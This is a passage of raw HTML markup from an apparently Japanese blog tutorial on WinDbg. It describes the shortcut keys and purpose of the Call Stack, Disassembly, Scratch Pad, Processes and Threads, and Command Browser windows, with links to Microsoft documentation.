      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e8d90c7d2822a07b5f84dcf8a22a631f/61946/image-3.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABbUlEQVQoz2WRWW/CMBCE8///VSUkSrnskBCTG2gOOwmECsTRh6nXxZFKHz7NZm1P1mNnNJlh9L7QLDGeckwWHqYswJwLTPkGM+aD+eE/OLGOBtynOm/jOT54AFfkiHc1kr00Gm1rxLpOP9ULjVHat8kKTYkwLxEke32mgpNlGVolEW4E8iyFrEvISlNXULJCo9dIf+varCtZmz1d2+Dr1KM/HtA2Et+POxzPX0OIDVzXRRAIpPoHaZo+NTOaJAmSZy+KYvNNe06nE3qNUg0OhwPud23IuIvVyoXneQjDENvt1pDnucHWZPDaL8sSVVWhKArsdjtcLhc4iyUD50ybrvSkYjAkKA7CmtAhUttr29ZMRtp1HW63G5wl4/B9fzC0JubaGmtGvVdDuvL5fMbxeETf97her3rCxdLkxxgzxnH8m5FVMiWNosjUtk+QEU1mJ3w8HvZRxJAR5UHZkFI+Sqk/SCkNVNN17XT2UX4A7dmNBp/sMPEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e8d90c7d2822a07b5f84dcf8a22a631f/8ac56/image-3.webp 240w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/d3be9/image-3.webp 480w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/e46b2/image-3.webp 960w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/f992d/image-3.webp 1440w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/87ef7/image-3.webp 1546w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e8d90c7d2822a07b5f84dcf8a22a631f/8ff5a/image-3.png 240w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/e85cb/image-3.png 480w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/d9199/image-3.png 960w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/07a9c/image-3.png 1440w,
/static/e8d90c7d2822a07b5f84dcf8a22a631f/61946/image-3.png 1546w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e8d90c7d2822a07b5f84dcf8a22a631f/d9199/image-3.png&quot;
            alt=&quot;image-3.png&quot;
            title=&quot;image-3.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Memoryウィンドウの用法については以下のドキュメントを参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/memory-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのメモリの表示と編集 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;8-call-stack-alt6キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#8-call-stack-alt6%E3%82%AD%E3%83%BC&quot; aria-label=&quot;8 call stack alt6キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;8. Call Stack ([Alt+6]キー)&lt;/h3&gt;
&lt;p&gt;8番のボタンをクリックすることで、Call Stackウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+6]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---call-stack&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;呼び出し履歴の表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Call Stackウィンドウにはスタック内の呼び出し履歴情報が表示されます。&lt;/p&gt;
&lt;p&gt;これは、Commandウィンドウで&lt;code class=&quot;language-text&quot;&gt;k&lt;/code&gt;コマンドを実行して呼び出したスタックトレースの情報と同一になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8d3483c3e7085965a85ff382babc6f5a/8cdda/image-4.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 95%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAACrElEQVQ4y5WUi3KaQBSGef+XadLp1Fya0cTWJvGOoqCgIAJRbmtETaP4d89ikibRpt2Zf87uwvnOZRek62oLlmmi3+/DMAYwTQvjsc3lIgoZV4QwiBFFpBAsjsFYnNk42tkYM5ZJ+pTLo1Cq4KJ4i/PCDc4K17i6qeMsX8JRroDj8xK+5Ms4vrjB528/cVKs4uSqglNuT4u1na0id1nG10IZUq2pIphOEPg+7ikyzyLyp4jDAIqqoz8cwXYnMG0Xk4Dhzo8RsLmYO5NArEnJao3lrxTS0VUL+eYQF/UBctUh8oqHH3qI73qM4m0TRk/FYGBAlpvQNBUdpQ3XddDvaahUylDaLXQ7Cm+LDxpSqdGDMb6DOnTQNV1YE4ZwuYG/2KChaBygQNU0dLtdqKoKhdbc9no9dDodtNttsWeNeCW2Dcmbxjg01J6OWq2KVqslDo0cCVCpVISlIPSMJMuy2JdGbiCcN2mKdLsV2pL4ntymrLoCRg4EIChlovGsq9UsGGXMGMPj4yMBQwEkyLPdzRuyIsrSdR2NRkM4EsCyLLFXr9dFIIIvl8ushw7v2TsgXjKkgzAM412GlDVlSGsCOo6DxWIBaexFfwF2uMNLr+ggqHcEpDllTUCaT6fTrGTb21MyH2m6hc7vIJXpuvyriSLM53OsViskSYLZbIaHhwes1+tnH1Gy7Uz2AjebDQZOwK9MH+ZwKEokeZ4nAjydMvUzCALxPsGlsePtB/IMB5YtehOEoXDaJ59/YaSntTQajQ9kmGLEgyXJ/NX+obHdXTfJOgBcc+DYm2DJT+5Ph7eAt4EkcwdM9wH5T2HxBviRJJP3KTvV9FXENW9yBkz+D/hU8vueAA4vebX7Av51SB1Vw/08QRjxv3M842KI2UysxT/QDxCx++wZ+1i/AT9Vj5Jgo13rAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8d3483c3e7085965a85ff382babc6f5a/8ac56/image-4.webp 240w,
/static/8d3483c3e7085965a85ff382babc6f5a/d3be9/image-4.webp 480w,
/static/8d3483c3e7085965a85ff382babc6f5a/e46b2/image-4.webp 960w,
/static/8d3483c3e7085965a85ff382babc6f5a/2768a/image-4.webp 1168w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8d3483c3e7085965a85ff382babc6f5a/8ff5a/image-4.png 240w,
/static/8d3483c3e7085965a85ff382babc6f5a/e85cb/image-4.png 480w,
/static/8d3483c3e7085965a85ff382babc6f5a/d9199/image-4.png 960w,
/static/8d3483c3e7085965a85ff382babc6f5a/8cdda/image-4.png 1168w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8d3483c3e7085965a85ff382babc6f5a/d9199/image-4.png&quot;
            alt=&quot;image-4.png&quot;
            title=&quot;image-4.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Call Stackウィンドウについては以下のドキュメントを参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/calls-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのコール スタックの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;9-disassembly-alt7キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#9-disassembly-alt7%E3%82%AD%E3%83%BC&quot; aria-label=&quot;9 disassembly alt7キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;9. Disassembly ([Alt+7]キー)&lt;/h3&gt;
&lt;p&gt;9番のボタンをクリックすることで、Disassemblyウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+7]キーです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---disassembly&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;逆アセンブリの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Disassemblyウィンドウでは、デバッグ対象のアセンブリコードを表示することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/33f9d2be7685707e323d19821c6e993f/0b533/image-5.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAAB7UlEQVQ4y42T626bQBCFef/nqfqvatNUjWOMbdzU3MLN5h6wLRsMNuDTnQXSJqJqRzrM7kh8O7tnV7h7mEFcPGE6f4Ikr7FSDCiGjZ9MPzQ2fragmjZUlpVBRi8+t7HWLWgs3z3MIXz88ojPExnfFyqW2gaTlcH0zMZbyIYHWfewYllxYqbknWKuNWU7wKdvEoTZfAldUxCFAY6HPRzbQpa+4HqpUF8vaJsa7IP/CS/OIIjSEoqiYLv1cDgcoOsGfN9HURQ4n0vUdc3UoG1vuN3G1bQtB7p+BEFaylBVFa7rIssymKYJx3GQ5zmqqkJZlrher/xHijEgLUaxIaAozWHoOvb7PdI0RZIkHHa5XPru6jewsXgDnIgS74hKp1OOsX/+ttVhgQG4DWIIH+4X+CqbWDg7zKyMO0amUGf/ildgn/2QAaeiyIzQ2FYJlCKOIm4IAZumeRXNW3b43IS+NkAHYBAx4ONU5Kb4foDdbgfbtvlZ0phMOh6PXHSutNDpdOIiswboAIzihDqc8WsThiGHbDYbbhA5O5jyp4Y6wYaO2/7aeEHUAXVNYx16HETXh3LT/IY0fLsdgOqkMfccL+xeisYucxBGSF5S2I4LPwhxzAsU7GLnRclzca5QlFU/7ubnsqvl9ACaFprl4hetfNpZnssUCAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/33f9d2be7685707e323d19821c6e993f/8ac56/image-5.webp 240w,
/static/33f9d2be7685707e323d19821c6e993f/d3be9/image-5.webp 480w,
/static/33f9d2be7685707e323d19821c6e993f/b0a15/image-5.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/33f9d2be7685707e323d19821c6e993f/8ff5a/image-5.png 240w,
/static/33f9d2be7685707e323d19821c6e993f/e85cb/image-5.png 480w,
/static/33f9d2be7685707e323d19821c6e993f/0b533/image-5.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/33f9d2be7685707e323d19821c6e993f/0b533/image-5.png&quot;
            alt=&quot;image-5.png&quot;
            title=&quot;image-5.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Disassemblyウィンドウについては以下を参照してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/disassembly-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのアセンブリ コードのデバッグ - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;10-scratch-pad-alt8キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#10-scratch-pad-alt8%E3%82%AD%E3%83%BC&quot; aria-label=&quot;10 scratch pad alt8キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;10. Scratch Pad ([Alt+8]キー)&lt;/h3&gt;
&lt;p&gt;10番のボタンをクリックすることで、Scratch Pad ウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Alt+8]キーです。&lt;/p&gt;
&lt;p&gt;Scratch Padとは、テキストを入力し、保存できるクリップボードです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/scratch-pad&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;スクラッチ パッドの使用 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;11-processes-and-threads-alt9キー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#11-processes-and-threads-alt9%E3%82%AD%E3%83%BC&quot; aria-label=&quot;11 processes and threads alt9キー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;11. Processes and Threads ([Alt+9]キー)&lt;/h3&gt;
&lt;p&gt;11番のボタンをクリックすることで、Processes and Threadsウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは [Alt+9]キーです。&lt;/p&gt;
&lt;p&gt;このウィンドウでは、デバッグ中のすべてのプロセスの一覧を参照できます。
以下の画像の例では、&lt;code class=&quot;language-text&quot;&gt;notepad.exe&lt;/code&gt;のプロセスの下に、プロセス内のスレッドがツリー状に表示されています。&lt;/p&gt;
&lt;p&gt;ここで、プロセスの表示は&lt;code class=&quot;language-text&quot;&gt;&amp;lt;デバッガーが使用する内部の10進数プロセスインデックス&gt;:&amp;lt;16進数のプロセス ID&gt; プロセスのアプリケーション名&lt;/code&gt;の形式になります。&lt;/p&gt;
&lt;p&gt;また、各スレッドの表示は、&lt;code class=&quot;language-text&quot;&gt;&amp;lt;デバッガーが使用する内部の10進数のスレッドインデックス&gt;:&amp;lt;16進数のスレッド ID&gt;&lt;/code&gt;を意味します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/processes-and-threads-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのプロセスとスレッドの制御 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5fe4090a03487b2049385dd4da71bb45/914c7/image-6.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 96.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAACqElEQVQ4y6VTaVPaUBTN//8b/dQPnWqtRcCVRSwKSBLIRkgCQiBh31Hx9N3bhkHq6HT6Zs7c+5Z73l2lqxsFllWHWrVQEdD0Oiy7CbfRFuigG4wQhGOE/QmCnoCQ3WAo9mP0BhOWu5A+fTnB99MUDuIpHCUyODhJ4TCRRuwih6NkVuzTOIynhX4t3oi9kF9j58Img+Oz7F+QPh+nkS/ruC5qyBYqSN8qyJU0Bp3lZROZOxU39zrrt7KFkuZAsZowvAC624Xmdliv1n1IifMM3LoF09CgVVUYWhWqUoapa6xXFBlyuQTHrqHrizTUbdY7fguzyRjz2QTL+QyL+ZSllLy6gee60HUDsqLAMAzYti3yasEwTUaj0eR9rVZDEAQIez10u120Wi0Mh0MsVyssFgusVmvh4WUODc9h0k7Hh+O46AkDMuz3+yx93xd3HZaDwYCNZ/P5H5IVnp+fES3pMnsnSBw0/RCj6Vz8HMLzPDw8PDAhGTw9PTHI8PHxkfXNZsMEJOnNy8sLQ0rlimiLn22vDbPuYTQaiRAbCMMQH62IZL1eMzETHvw4R90W+dJ1lO/vOcR2u82h7Rq9heievN6GnBQ5rKgKqlUNqqpykukBhbFP+JZ3tMgJRVG4cNJVtiiIZGiaJiqtYzwevzL6KNyIsFAooFgsQjo5S4uQa6JdTPaQCrFL9pZ3+/fL5ZKjolxK32IXsGsme1gqlbbFeM+7fUIi2uYwlriA6zrc0JVKhXswaof3CrILIty2TSyeZEJKqCzL25D/Zb0ijCdOBdnv/FFRaKRmsxljOp1iMplsdZoMamrK1y5ehfwzX0AgSBwxelRhSjA1N+lEQogI52LcqJ32QYTRNEnpTI7LTv1HRGRMhruIziLP9xF9TJAKJRmbneH+3/ULnCeSIYVollMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5fe4090a03487b2049385dd4da71bb45/8ac56/image-6.webp 240w,
/static/5fe4090a03487b2049385dd4da71bb45/d3be9/image-6.webp 480w,
/static/5fe4090a03487b2049385dd4da71bb45/e46b2/image-6.webp 960w,
/static/5fe4090a03487b2049385dd4da71bb45/0e613/image-6.webp 978w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5fe4090a03487b2049385dd4da71bb45/8ff5a/image-6.png 240w,
/static/5fe4090a03487b2049385dd4da71bb45/e85cb/image-6.png 480w,
/static/5fe4090a03487b2049385dd4da71bb45/d9199/image-6.png 960w,
/static/5fe4090a03487b2049385dd4da71bb45/914c7/image-6.png 978w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5fe4090a03487b2049385dd4da71bb45/d9199/image-6.png&quot;
            alt=&quot;image-6.png&quot;
            title=&quot;image-6.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;12--command-brouser-ctrlnキー&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#12--command-brouser-ctrln%E3%82%AD%E3%83%BC&quot; aria-label=&quot;12  command brouser ctrlnキー permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;12.  Command Brouser ([Ctrl+N]キー)&lt;/h3&gt;
&lt;p&gt;12番のボタンをクリックすることで、Command Brouserウィンドウを開くことができます。&lt;/p&gt;
&lt;p&gt;ショートカットキーは[Ctrl+N]キーです。&lt;/p&gt;
&lt;p&gt;このウィンドウでは、コマンドの出力結果を取得することができます。&lt;/p&gt;
&lt;p&gt;実行するコマンドは、Commandウィンドウで入力するコマンドと同一ですが、コマンドの実行履歴などを利用して効率的なコマンド実行を実現できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/command-browser-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのコマンド ブラウザー ウィンドウの使用 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5c82a90dcc5ab7c9aa5f326453370b4d/75b1f/image-7.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB+klEQVQ4y4WTCZOiMBCF+f//ao+xxmNAIEC48UAZVlFuS5G3TXad0p1aJ1VfpZNKv7zQjTSTFcw1E4pqQDM4DO7CcgIihMo47TMoOsfccD7QTBfqEDMbjPvQuQfN8qCSjjTTbJjcgWE58KMVuBuQkAk3WGCb7uCFa/wcy5goTMxjWcdoOhfIfy/yohhRnCJaxJCWFGT7HXa7X8iPB8H7e4Is2wPo0bQn2NxCGHjwPReLKEQUBmLexGsc6NyectumRne5QKqbFs9GXlSwuI1NkqKqKjRNI2jbFnVd49J1H2ev1yuksqrFou/7T9wEuU3PCiK4rosoirBer2GaJjjnSNP0X8HmuWBZQabCGUyHYRhQVRWapoExJmLLsoT4arVCEASPgvfj3qGm68LNkGzbtnCq094gmiQJDocDyrJEURRfCx7zkhzpQuwmHIYhuZaF0yzLHvIevuH/HOo6E0KOQ63l+1gul+KZg9vNZoMLVXcYHRXoy6IU9ALPDygxFm6GyuZ5LjidTg8mRFEGB0Ny113RXe+gtXhyUYs/YbGIyJGD7TahC3zhOI5jaqFWOBwY2knqusvTPjyfzzgOTd7TBX33Z6aGFzH6T+el7xMdE83F+IbuE4FgYoT4odj4JlsYG7RmPmbMhUJMVQejNwMvUw0vr28YvU6JMX4DWdzMnEsSmBIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5c82a90dcc5ab7c9aa5f326453370b4d/8ac56/image-7.webp 240w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/d3be9/image-7.webp 480w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/e46b2/image-7.webp 960w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/f992d/image-7.webp 1440w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/f6ed9/image-7.webp 1699w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5c82a90dcc5ab7c9aa5f326453370b4d/8ff5a/image-7.png 240w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/e85cb/image-7.png 480w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/d9199/image-7.png 960w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/07a9c/image-7.png 1440w,
/static/5c82a90dcc5ab7c9aa5f326453370b4d/75b1f/image-7.png 1699w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5c82a90dcc5ab7c9aa5f326453370b4d/d9199/image-7.png&quot;
            alt=&quot;image-7.png&quot;
            title=&quot;image-7.png&quot;
            loading=&quot;lazy&quot;
